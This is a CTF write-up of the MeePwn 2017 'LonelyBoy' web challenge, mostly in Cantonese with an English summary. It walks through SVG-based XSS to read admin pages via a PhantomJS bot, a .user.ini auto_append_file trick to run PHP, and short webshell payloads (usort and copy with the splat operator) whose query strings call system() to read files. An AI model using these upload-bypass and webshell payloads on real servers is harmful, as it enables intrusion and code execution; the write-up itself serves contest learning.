# MeePwn CTF 2017: LonelyBoy

### (web, 1000 points, 1 team solved)

說明
>I saw the website of a lonely boy out there, it looks like he wants to be cheered up, can you help him?
>
> Flag is in /
>
> Remote: 188.166.242.140

奇怪的通知

📢 Notice: We use phantomjs to evaluate your submitted url

孤獨的提示

💡 Hint 1: Wow .SaVaGe , nobody care about him... please come to tsu home, tsu want to make friend at his HOME!

💡 Hint 2: POST is so complex, better go to his HOME with GET

💡 Hint 3: Hey FRIEND! Information Gathering is important :)

💡 Hint 4: Well, its not a common php, another php :D

💡 Hint 5: u.....sort! sort! sort!, splat! splat! splat!.... some animals voice around his house..., try to rce :D


## 題解
呢題 No one plays. 真係夠晒 Lonely. 一開始個 Flag is in / 真係好誤導. 整到咁多 part 又係老點.

求其註冊登入之後有個位可以 upload 相. 

話說 upload 個扮係 jpg 既 txt 係會 block 9 你. 見到可以 upload svg 明眼人一睇就知係玩 XSS. 個 svg 你想寫乜都得.

隊個 Cookie stealer 冇反應. 之後我去 IRC 問個作者你個 bot 係咪壞輪左. 佢話好正常你再試下. 可能係個 bot 唔認 svg 係網頁.

因為佢有 check 個 file 是咪 from 佢個 website. 試下試下發現吊佢剩係 check 個 url 有冇 ht​tp://188.166.242.140/

即係 ht​tp://example.com/x.php?ht​tp://188.166.242.140/ 佢係識讀.

之後響自己個網度放個 iframe 連返去佢個網個 svg 又得. 

點解要搞咁多野連返去佢個網係因為有 CORS. 個 svg 響佢個網度就可以為所欲為 好似係

之後用個 xhr 讀下 admin login 狀態下 d page. 點知讀唔到. 唔知咩事. 

之後搞一大輪試下試下發現佢個 bot 成日 timeout. 所以我加個 loop 讀下我個網睇下佢幾時先 timeout.出事. 

點知佢唔識 timeout. 炸我 server 炸左半粒鐘. 我自己又硬膠膠唔 timeout. 佢又唔 timeout. 大家攬炒. 

我之後去 IRC 同佢話你個 bot 炸鳩緊我. 佢之後話 reset 左. 我再睇 log 發現佢係重 send 緊 request. 說好的 reset 呢.

大家睇到呢度係咪開始唔想睇呢. 之後我真係讀到 admin 狀態下既 files.php 啦. 點知條友仔半個 file 都冇 upload. 

之後睇返佢堆孤獨的提示. 佢果陣出到第一個提示 話咩 go HOME. 係咪去 /home 啊頂你你又話 Flag is in / 想點. 

之後發現個 homepage 叫 home.php. 讀下佢個 home.php 發現佢多左個咩 email_address_of_tsu_friend.

哇唔通你想玩 phantomjs 幫你 sql injection 定 mail(). 大佬真係隔山打牛. 

之後叫個 bot run ht​tp://188.166.242.140/home.php?email_address_of_tsu_friend=真email. 點知真係收唔到 email.

我去 IRC 問下條友 問佢你個 mail function 係咪壞能左. 佢叫我打返註冊用個 email 就算喎. 

頂你正常入個 username 算啦入乜鬼 email. 搞一大輪唔知點解變左做 friend. 之後多左個 upload box.

今次個 upload box 據聞可以 upload 任何野. 咁第一時間梗係 upload php. 吊啦 block 9 我. 咁 php 唔得試下 pht. 又唔能得. 

咁試下 phd. 得左. 但係 phd 係冇用既 (好似係). 因為 run 唔 lun 到. 

咁試下 upload .htaccess 加個 MIME type. 又 block 9 ht. 乜能都做唔到. 

之後打多過 20 個字又鬧我. 試試下打左個 Exec 響入面又話 Malicious! 吊啦. 

之後 **唔知點樣試到** .user.ini 可以加 d setting. 加個 auto_append_file=z 拿佢限 20 個字 auto_append_file=.svg 21個字. 吊佢.

因為你有 setting 冇 php 都冇能用. 然後 **唔知點解搵到** index.php 竟然係用 php. 

正常人應該用 index.htm 或者 index.html 啦. 又唔係要動用咩 server-side script. 

咁你 upload 多個 z 入面係 `<?=phpinfo();` 就有野睇.

---
呢段開始先仆街. 

佢個 upload 除左 block exec 之外重 block 好能多野. 咩 eval system passthru. 

試試下 include 冇事. 咁好正路 upload 返個 svg include 佢搞掂.

list 到個 / 入面有個 goodjobnowgetyoursfl4g 咁試下 cat 佢. 冇料到. 即係 directory.

之後想 list /goodjobnowgetyoursfl4g 果下先仆街. 無端端話 Malicious!

個作者響 IRC 話 block 漏 include 同 require. 吊你想點啊. 佢話之後會再出提示點玩喎. 你玩晒啦.

結果 on99 咁睇個 php manual 搵下 d 短名 function. 有個叫 dl 都唔知點能用. 

之後發現佢冇 block popen. 不過玩 popen 又要 reverse shell 好能煩.

---
搞下搞下之後佢出第五個提示話咩 usort splat. 吊又係用 d 濕鳩 callback. 咁用 usort 囉. 

至於 splat 係乜野? 佢係將個 array 爆做 argument 既奇怪 operator. 即係 python 入面 **kwargs d friend. 

因為你想用 querystring 塞野既話 你要用 $_GET[0], $_GET[x] 之類. 想塞兩舊就已經用好多字.

用 splat 就係 ...$_GET, 塞幾多都得. 最後個 file 係 `<?=usort(...$_GET);`

正常 usort 係會將 第一個 argument ($_GET[0]) 個 array 做 sorting. 如果有 callback 就係第 k 同 k+1 個 element 放去個 callback 度:

`usort(...$_GET)` ==> `$_GET[1]($_GET[0][0],$_GET[0][1]); $_GET[1]($_GET[0][1],$_GET[0][2]);` etc.

但係唔知做乜春佢個 server 係 `$_GET[1]($_GET[0][1],$_GET[0][0])`

結果要咁能樣 
> ht​tp://188.166.242.140/upload/whatever/index.php?0[0]=0&0[1]=diu&1=print_r

先識 `print_r("diu",0)` (print_r 第二個 argument false 就會直接 echo 出黎. true 就儲去個 variable 度)

之後睇下 system 果堆 function. system 第二個 argument 要係個 variable reference 指返個 output. 

我響我個 server run `system("ls",0)` 係 run 唔能到既. 但係有朋友發現佢果度唔知點解 run 到.

之後就 
> ht​tp://188.166.242.140/upload/whatever/index.php?0[0]=0&0[1]=cat%20/goodjobnowgetyoursfl4g/Yes_This_Is_What_You_Are_Looking_FoR_FlagGgGg&1=system

搞一大堆咁能辛苦終於解到.

## 後記
佢個 usort 簡直係老點. 不知所謂. run `system("ls",0)` 就好似 run `0=1` 咁搞笑. usort 個 array 又好似調轉左咁.

做完之後發現有個 function 叫 copy 冇 block 到. 咁 `<?=copy(...$_GET);` 少佢一隻字添. 做多好多野添. 

例如 ht​tp://188.166.242.140/upload/whatever/index.php?0[0]=0.svg&0[1]=../yaoi.php

就會出 [http://188.166.242.140/upload/yaoi.php](http://archive.is/5qJGy)

---
# English version
In short it is "XSS read page + ??? + Webshell" 

<ol>
<li>XSS read page</li>
  <ul>
  <li>upload a file with javascript on the victim server to bypass CORS</li>
    <ul>
    <li>svg is perfect because other image format are checked</li>
    <li>the script includes logics to read home.php and send back to your server</li>
    <li>add some loops to read some pages to prevent the bot from timing out</li>
    </ul>
  <li>upload a page on your own server with <iframe src=that_svg_file> (instead of using <img> or directly query the svg file due to the bot issue)</li>
  <li>ask the bot to query the page with ?ht​tp://188.166.242.140/ at the end to bypass checking</li>
  </ul>

<li>???</li>
  <ul>
  <li>when you got the content of home.php, you found weird form with parameter email_address_of_tsu_friend</li>
  <li>ask the bot to query ht​tp://188.166.242.140/home.php?email_address_of_tsu_friend=your_email_account</li>
  <li>why you need to fill in your email account in the system? it is a feature maybe. </li>
  </ul>

<li>Webshell</li>
  <ul>
  <li>upload .user.ini with auto_append_file=whatever or auto_prepend_file=whatever. make whatever shorter.</li>
  <li>upload whatever with phpcode like &lt;?=phpinfo();, &lt;?=$_GET[0]('ls /');, &lt;?=usort(...$_GET); or &lt;?=copy(...$_GET);</li>
  <li>go to index.php and add some querystring according to your payload</li>
    <ul>
    <li>give ?0=system to &lt;?=$_GET[0]('ls /');</li>
    <li>give ?0[0]=0&0[1]=ls%20/&1=system to &lt;?=usort(...$_GET);</li>
    </ul>
  <li>do whatever you like</li>
  </ul>
 </ol>
